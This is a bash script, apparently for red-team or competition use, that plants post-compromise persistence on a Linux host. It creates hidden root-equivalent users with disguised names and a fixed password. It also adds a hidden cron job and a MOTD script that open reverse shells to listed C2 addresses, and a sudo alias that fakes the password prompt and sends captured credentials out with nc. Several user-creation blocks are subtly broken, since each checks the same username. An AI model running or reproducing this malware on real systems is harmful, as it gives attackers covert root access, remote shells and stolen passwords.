#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "This script must be run as root or with sudo. Please try again."
  exit 1
fi

echo "Deploying persistence mechanisms..."

# --- User Persistence ---
# Create a single root-equivalent user non-interactively if it doesn't exist.
# Username 'sysadmim' is a typo for 'admin' to be less obvious.
if ! id "sysadmim" &>/dev/null; then
    useradd -ou 0 -g 0 sysadmim
    echo "sysadmim:HighlySecure" | chpasswd
    echo "User 'sysadmim' created with root privileges."
else
    echo "User 'sysadmim' already exists."
fi

if ! id "sysadmim" &>/dev/null; then
    useradd -ou 0 -g 0 bbob
    echo "bbob:HighlySecure" | chpasswd
    echo "User 'sysadmim' created with root privileges."
else
    echo "User 'sysadmim' already exists."
fi

if ! id "sysadmim" &>/dev/null; then
    useradd -ou 0 -g 0 systend
    echo "systend:HighlySecure" | chpasswd
    echo "User 'sysadmim' created with root privileges."
else
    echo "User 'sysadmim' already exists."
fi

if ! id "sysadmim" &>/dev/null; then
    useradd -ou 0 -g 0 gameuser
    echo "gameuser:HighlySecure" | chpasswd
    echo "User 'sysadmim' created with root privileges."
else
    echo "User 'sysadmim' already exists."
fi


# --- Cron Persistence ---
# Create a single, less noisy cron job that executes a helper script.
C2_SCRIPT_PATH="/usr/local/bin/.system-health-check"
echo "-> Creating cron helper script at $C2_SCRIPT_PATH..."
cat << 'EOF' > $C2_SCRIPT_PATH
#!/bin/bash
# This script attempts to establish a reverse shell to a list of C2 servers.
C2_SERVERS=(
    "10.0.0.100:4240"
    "172.20.241.20:4241"
    "10.0.0.1:4242"
    "10.0.0.2:4243"
    "10.0.0.155:4244"
    "10.0.1.20:4245"
    "10.0.1.3:4246"
    "172.20.253.20:4247"
    "10.0.0.3:4248"
)

# Shuffle the array to randomize connection attempts
C2_SERVERS=($(shuf -e "${C2_SERVERS[@]}"))

for server in "${C2_SERVERS[@]}"; do
    IP=$(echo $server | cut -d: -f1)
    PORT=$(echo $server | cut -d: -f2)
    # Check if host is reachable with a 3-second timeout before attempting to connect
    if nc -z -w 3 $IP $PORT &>/dev/null; then
        /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1
        # If connection is successful, exit the script
        exit 0
    fi
done
EOF

chmod +x $C2_SCRIPT_PATH

# Add the cron job to run every 15 minutes if it doesn't already exist
CRON_JOB="*/15 * * * * $C2_SCRIPT_PATH"
if ! (crontab -l 2>/dev/null | grep -Fq "$C2_SCRIPT_PATH"); then
    (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
    echo "Cron job created to run every 15 minutes."
else
    echo "Cron job already exists."
fi


# --- Sudo Password Capture & Execution Hijack ---
# This alias will capture the sudo password, exfiltrate it, and then run the command.
# It's placed in /etc/profile.d/ to apply to all users on next login.
SUDO_HIJACK_PATH="/etc/profile.d/system-auth.sh"
echo "-> Creating sudo hijack at $SUDO_HIJACK_PATH for system-wide password capture..."
cat << 'EOF' > $SUDO_HIJACK_PATH
alias sudo='f() {
    # IP and Port to send captured credentials to
    C2_IP="172.17.0.1"
    C2_PORT="4250"

    # Mimic the real sudo prompt and read the password
    read -sp "[sudo] password for $USER: " PWD
    echo

    # Send username and password to C2 in the background
    echo "user=$USER pass=$PWD" | nc -w 1 $C2_IP $C2_PORT &

    # Execute the original command with the captured password
    echo "$PWD" | /usr/bin/sudo -S $@
    
    # Unset the function to avoid issues in the current shell
    unset -f f
}; f'
EOF
echo "Sudo hijack alias created. It will be active on next user login."


# --- MOTD Persistence ---
# This will trigger a reverse shell on user login. Placed late in the sequence (99)
MOTD_SCRIPT_PATH="/etc/update-motd.d/99-footer"
echo "-> Creating MOTD persistence script at $MOTD_SCRIPT_PATH..."
cat << 'EOF' > $MOTD_SCRIPT_PATH
#!/bin/sh
# Triggers a reverse shell to a fallback C2.
/bin/bash -i >& /dev/tcp/172.17.0.1/4249 0>&1 &
exit 0
EOF

chmod +x $MOTD_SCRIPT_PATH
echo "MOTD persistence added. Will trigger on next login."

echo -e "Persistence script finished."